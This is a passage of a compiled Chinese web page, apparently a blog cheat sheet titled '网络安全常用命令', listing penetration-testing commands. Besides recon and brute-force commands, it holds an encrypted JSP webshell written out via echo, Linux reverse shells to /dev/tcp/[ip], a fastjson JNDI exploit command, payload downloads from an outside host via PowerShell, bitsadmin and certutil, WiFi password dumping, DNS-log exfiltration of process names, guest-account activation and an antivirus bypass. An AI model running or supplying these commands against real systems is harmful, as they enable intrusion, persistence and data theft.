style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> dir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 50</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gobuster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> dir</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -k</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 50</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">feroxbuster</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">feroxbuster</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> php</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -k</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wfuzz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1/?FUZZ.php</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/Web-Content/burp-paraameter-names.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;cookie: PHPSESSID=asdh231asdad&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --hh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1678</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wfuzz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/wordlists/rockyou.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;key=FUZZ&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --hw</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 25</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ffuf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1/FUZZ</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 50</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -mc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 200</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># domain brute:</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wfuzz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HOST: FUZZ.127.0.0.1&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wfuzz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;HOST: FUZZ.127.0.0.1&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --hh</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 315</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wfuzz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Host: FUZZ.127.0.0.1&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --hc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 302,400</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 50</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;User-Agent: luzesec&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -z</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> file,&quot;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&quot;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wfuzz</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -H</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Host: FUZZ.127.0.0.1&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --hl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 7</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">gobuster</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> vhost</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http://127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -t</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gobuster_vhost.txt</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ssrf探测:</span></span>\n<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ffuf</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /opt/SecLists/Fuzzing/4-digits-0000-9999.txt</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;http://127.0.0.1/?url=&quot;http://127.0.0.1:FUZZ&quot;&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -fs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="其他" tabindex="-1"><a class="header-anchor" href="#其他"><span>其他</span></a></h2><div class="hint-container tip"><p class="hint-container-title">常用命令</p><h2 id="windows查找文件" tabindex="-1"><a class="header-anchor" href="#windows查找文件"><span>windows 查找文件</span></a></h2><p><code>dir c:\\ /s /b | find &quot;win.ini&quot;</code></p><h2 id="linux查找文件" tabindex="-1"><a class="header-anchor" href="#linux查找文件"><span>linux 查找文件</span></a></h2><p><code>find / -name passwd</code></p><h2 id="windows写文件" tabindex="-1"><a class="header-anchor" href="#windows写文件"><span>windows 写文件</span></a></h2><p><code>echo ^&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%^&gt; &gt;&gt; C:/x/x.jsp</code></p><p><code>echo ^&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^&gt; &gt;&gt; C:/x/x.jsp</code></p><p><code>echo ^&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^&gt; &gt;&gt; C:/x/x.jsp</code></p><h2 id="linux写文件" tabindex="-1"><a class="header-anchor" href="#linux写文件"><span>linux 写文件</span></a></h2><p><code>echo xxxxx== |base64 -d &gt; /var/www/html/1.jsp</code></p><h2 id="获取操作系统命令" tabindex="-1"><a class="header-anchor" href="#获取操作系统命令"><span>获取操作系统命令</span></a></h2><p><code>wmic OS get Caption,CSDVersion,OSArchitecture,Version</code></p><h2 id="主机收集" tabindex="-1"><a class="header-anchor" href="#主机收集"><span>主机收集</span></a></h2><ul><li><p>查看 rdp 链接记录 <code>cmdkey /list</code></p></li><li><p>查看 dns 记录 <code>ipconfig /displaydns</code></p></li><li><p>查看 arp 记录 <code>arp -a</code></p></li><li><p>查看在线用户 <code>qwinsta</code></p></li><li><p>查看系统的盘符 <code>wmic logicaldisk where DriveType=3 get DeviceID</code></p></li><li><p>查看所有用户的 <code>sid wmic useraccount get name,sid</code></p></li><li><p>windows 查看桌面目录 <code>reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders&quot; /s</code></p></li><li><p>查看浏览记录 <code>reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\TypedURLs&quot;</code></p></li><li><p>根据进程查找进程文件<br><code>wmic process where name=&quot;xxxx.exe&quot; get processid,executablepath,name</code> <br><code>wmic process where name=&quot;chrome.exe&quot; list full</code></p></li><li><p>查看当前系统是否有屏保保护，延迟是多少<br><code>wmic desktop get screensaversecure,screensavertimeout</code></p></li><li><p>查看当前系统是否是 VMWARE<br><code>wmic bios list full | find /i &quot;vmware&quot;</code></p></li><li><p>显示系统中的曾经连接过的无线密码<br><code>netsh wlan show profiles</code></p></li></ul><h3 id="windows常用的系统变量" tabindex="-1"><a class="header-anchor" href="#windows常用的系统变量"><span>windows 常用的系统变量</span></a></h3><ul><li>查看当前用户目录 <code>echo %HOMEPATH%</code></li><li>查看当前目录 <code>echo %CD%</code></li><li>列出用户共享主目录的网络路径 <code>echo %HOMESHARE%</code></li><li>列出有效的当前登录会话的域名控制器名</li><li>列出了可执行文件的搜索路径 <code>echo %Path%</code></li><li>列出了处理器的芯片架构 <code>echo %PROCESSOR_ARCHITECTURE%</code></li><li>列出了 Program Files 文件夹的路径 <code>echo %ProgramFiles%</code></li><li>列出了当前登录的用户可用应用程序的默认临时目录 <code>echo %TEMP% and %TMP%</code></li><li>列出了当前登录的用户可用应用程序的默认临时目录 <code>echo %TEMP% and %TMP%</code></li><li>列出了包含用户帐号的域的名字 <code>echo %USERDOMAIN%</code></li><li>列出操作系统目录的位置 <code>echo %WINDIR%</code></li><li>返回 “所有用户” 配置文件的位置 <code>echo %ALLUSERSPROFILE%</code></li><li>返回处理器数目 <code>echo %NUMBER_OF_PROCESSORS%</code></li><li>powershell 地址 <code>echo %PSModulePath%</code></li></ul><h2 id="查看wifi密码" tabindex="-1"><a class="header-anchor" href="#查看wifi密码"><span>查看 wifi 密码</span></a></h2><p><code>for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear</code></p><h2 id="fastjson执行命令" tabindex="-1"><a class="header-anchor" href="#fastjson执行命令"><span>fastjson 执行命令</span></a></h2><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c {echo,cGluZyBgd2hvYW1pYC4xZnUwYnguZG5zbG9nLmNu}|{base64,-d}|{bash,-i}&quot; -A &quot;x.x.x.x&quot;</code></p><h2 id="linux反弹shell" tabindex="-1"><a class="header-anchor" href="#linux反弹shell"><span>linux 反弹 shell</span></a></h2><p><code>bash -i &gt;&amp; /dev/tcp/[ip]/5555 0&gt;&amp;1</code></p><p><code>exec 5&lt;&gt;/dev/tcp/[ip]/5555;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></p><p><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;[ip]&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</code></p><h2 id="查看是否跨网段" tabindex="-1"><a class="header-anchor" href="#查看是否跨网段"><span>查看是否跨网段</span></a></h2><p>Windows: <code>route print</code> <br> Linux: <code>route</code> <br> mac: <code>netstat -nr</code></p><h2 id="powershell" tabindex="-1"><a class="header-anchor" href="#powershell"><span>powershell</span></a></h2><p>certutil 写文件</p><p>certutil 编码文件 <code>certutil -encode 1.txt output.txt</code></p><p>certutil 解码文件 <code>certutil -decode output.txt input.txt</code></p><p>powershell 写入 <code>powershell -c &quot;&#39;xxxxxxxx&#39; | Out-File input.txt -Append&quot;</code></p><p>powershell 写入方法 2 <code>powershell -c &quot;add-content C:\\1.bat -value \\&quot;test\\&quot;&quot;</code></p><p>powershell 写入方法 2 后续 (去除换行) <code>powershell &quot;-join((gc -LiteralPath \\&quot;c:\\1.bat\\&quot;))&quot;</code></p><h2 id="windows探测" tabindex="-1"><a class="header-anchor" href="#windows探测"><span>windows 探测</span></a></h2><p><code>for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;</code></p><p><code>for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;&gt;&gt;&quot;c:\\a.txt&quot;</code></p><p><code>for /l %i in (1,1,255) do @ping 192.168.%i.1 -w 1 -n 1 | find /i &quot;ttl&quot;</code></p><h2 id="linux探测" tabindex="-1"><a class="header-anchor" href="#linux探测"><span>linux 探测</span></a></h2><p><code>for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done</code></p><h2 id="certutil-powershell探测出网" tabindex="-1"><a class="header-anchor" href="#certutil-powershell探测出网"><span>certutil powershell 探测出网</span></a></h2><p><code>certutil -urlcache -split -f http://pibfq6603bhlew7kjztwvnepwg26qv.burpcollaborator.net</code></p><p><code>powershell Invoke-WebRequest &quot;http://aq4xs444jvmwj3831uxpe9cl6cc20r.burpcollaborator.net/&quot;</code></p><h2 id="windows-2008-开启3389" tabindex="-1"><a class="header-anchor" href="#windows-2008-开启3389"><span>windows 2008 开启 3389</span></a></h2><p><code>wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</code></p><p><code>wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</code></p><p><code>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></p><h2 id="查看防火墙规则" tabindex="-1"><a class="header-anchor" href="#查看防火墙规则"><span>查看防火墙规则</span></a></h2><p><code>netsh firewall show config</code> <br><code>netsh firewall show state</code></p><h2 id="windows查看计划任务" tabindex="-1"><a class="header-anchor" href="#windows查看计划任务"><span>windows 查看计划任务</span></a></h2><p><code>schtasks /QUERY /fo LIST /v</code></p><h2 id="windows下载文件常用命令" tabindex="-1"><a class="header-anchor" href="#windows下载文件常用命令"><span>windows 下载文件常用命令</span></a></h2><p><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.28.128/payload.txt&#39;,&#39;payload.exe&#39;)</code></p><p><code>bitsadmin /transfer n http://192.168.28.128/payload.txt C:\\Users\\administrator\\Desktop\\1.txt</code></p><p><code>certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php</code></p><h2 id="windows查看历史命令" tabindex="-1"><a class="header-anchor" href="#windows查看历史命令"><span>windows 查看历史命令</span></a></h2><p><code>type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt</code></p><p><code>type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt</code></p><h2 id="windows自带压缩" tabindex="-1"><a class="header-anchor" href="#windows自带压缩"><span>windows 自带压缩</span></a></h2><ul><li><p><strong>windows 自带的解压命令</strong> <code>iexpress</code></p><p><strong>windows 自带的压缩命令，压缩成啥看自己</strong> <code>zip,rar,cab</code></p><p><code>makecab 1.doc 1.zip</code></p></li><li><p><strong>解压命令</strong></p><p><code>expand 1.zip 1.doc</code></p></li><li><p><strong>先把要解压的多个文件名写入 txt</strong></p><p><code>dir /b &gt;&gt;name.txt</code></p><p><strong>压缩</strong></p><p><code>makecab /f name.txt /d maxdisksize=1024000</code></p><p><strong>解压缩</strong></p><p><code>expand 1.cab -f:* c:\\test\\</code></p></li></ul><h2 id="windows计算文件hash" tabindex="-1"><a class="header-anchor" href="#windows计算文件hash"><span>windows 计算文件 hash</span></a></h2><p><code>certutil.exe -hashfile 1.txt</code></p><h2 id="windows设置终端代理" tabindex="-1"><a class="header-anchor" href="#windows设置终端代理"><span>windows 设置终端代理</span></a></h2><p><code>set http_proxy=http://127.0.0.1:1080</code></p><h2 id="windows强制停止进程" tabindex="-1"><a class="header-anchor" href="#windows强制停止进程"><span>windows 强制停止进程</span></a></h2><p><strong>停止指定 pid 进程</strong></p><p><code>taskkill /f /pid 3352</code></p><p><strong>停止指定 exe</strong></p><p><code>taskkill /f /im explor.exe</code></p><h2 id="windows通过dns查找进程" tabindex="-1"><a class="header-anchor" href="#windows通过dns查找进程"><span>windows 通过 dns 查找进程</span></a></h2><p><code>for /F %i in (&#39;wmic process get Name ^| findstr &quot;.exe&quot;&#39;) do ping -n 1 %i.******.dnslog.cn &gt;nul</code></p><h2 id="windows激活guest" tabindex="-1"><a class="header-anchor" href="#windows激活guest"><span>windows 激活 guest</span></a></h2><p><strong>激活 guest 用户</strong></p><p><code>net user guest /active:yes</code></p><p><strong>更改 guest 用户的密码</strong></p><p><code>net user guest mstlab</code></p><h2 id="windows查询终端端口" tabindex="-1"><a class="header-anchor" href="#windows查询终端端口"><span>windows 查询终端端口</span></a></h2><p><code>REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp /v PortNumber</code></p><h2 id="绕过火绒" tabindex="-1"><a class="header-anchor" href="#绕过火绒"><span>绕过火绒</span></a></h2><p><code>copy c:\\windows\\system32\\net1.exe aaa.txt</code> <br><code>aaa.txt user xxxx 123456 /add</code></p><p><strong>绕过火绒下载文件</strong></p><p><code>&quot;c&quot;&quot;e&quot;&quot;r&quot;&quot;t&quot;&quot;u&quot;&quot;t&quot;&quot;i&quot;&quot;l&quot; -&quot;u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot; -split -f https://url/1.exe 1.exe</code></p><h2 id="cs上转发3389端口避免告警" tabindex="-1"><a class="header-anchor" href="#cs上转发3389端口避免告警"><span>CS 上转发 3389 端口避免告警</span></a></h2><p><code>portfwd add -r 127.0.0.1 -p 3389 -l 1234</code></p></div>',8)])])}]]),e=JSON.parse('{"path":"/popular/command-ct.html","title":"网络安全常用命令","lang":"zh-CN","frontmatter":{"title":"网络安全常用命令","icon":"file-shield","date":"2022-04-16T00:00:00.000Z","lastUpdated":false,"description":"Linux 应急 防火墙相关 爆破常用 其他 常用命令 windows 查找文件 dir c:\\\\ /s /b | find \\"win.ini\\" linux 查找文件 find / -name passwd windows 写文件 echo ^<%@page import=\\"java.util.*,javax.crypto.*,javax.crypto....","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"网络安全常用命令\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2022-04-16T00:00:00.000Z\\",\\"dateModified\\":\\"2025-12-14T14:09:37.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Morpheus\\",\\"url\\":\\"https://suidx.com\\"}]}"],["meta",{"property":"og:url","content":"https://suidx.com/popular/command-ct.html"}],["meta",{"property":"og:site_name","content":"Morpheus"}],["meta",{"property":"og:title","content":"网络安全常用命令"}],["meta",{"property":"og:description","content":"Linux 应急 防火墙相关 爆破常用 其他 常用命令 windows 查找文件 dir c:\\\\ /s /b | find \\"win.ini\\" linux 查找文件 find / -name passwd windows 写文件 echo ^<%@page import=\\"java.util.*,javax.crypto.*,javax.crypto...."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-12-14T14:09:37.000Z"}],["meta",{"property":"article:published_time","content":"2022-04-16T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-12-14T14:09:37.000Z"}]]},"git":{"createdTime":1765721377000,"updatedTime":1765721377000,"contributors":[{"name":"Morpheus","username":"Morpheus","email":"example@cn.com","commits":1,"url":"https://github.com/Morpheus"}]},"readingTime":{"minutes":6.34,"words":1902},"filePathRelative":"popular/command-ct.md","excerpt":"<h2>Linux 应急</h2>\\n<div class=\\"language-sh line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"sh\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code class=\\"language-sh\\"><span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 查看Linux中占用资源情况</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">top</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -c</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -o</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> %CPU</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># cpu占用前5的信息</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ps</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -eo</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> pid,ppid,%mem,%cpu,cmd</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> --sort=-%cpu</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">head</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -n</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> 5</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 查看网络通信的情况</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">lsof</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -i</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -PnR</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 寻找pid对应的进程</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">ps</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> aux</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> | </span><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">grep</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [pid]</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 查看进程打开的文件</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">lsof</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -p</span><span style=\\"--shiki-light:#383A42;--shiki-dark:#ABB2BF\\"> [pid]</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 查看网络和端口情况</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">netstat</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -utnpl</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic\\"># 显示进程和端口的对应关系</span></span>\\n<span class=\\"line\\"><span style=\\"--shiki-light:#4078F2;--shiki-dark:#61AFEF\\">lsof</span><span style=\\"--shiki-light:#986801;--shiki-dark:#D19A66\\"> -i</span><span style=\\"--shiki-light:#50A14F;--shiki-dark:#98C379\\"> :[port]</span></span>\\n<span class=\\"line\\"></span>\\n<span class=\\"line\\"><span 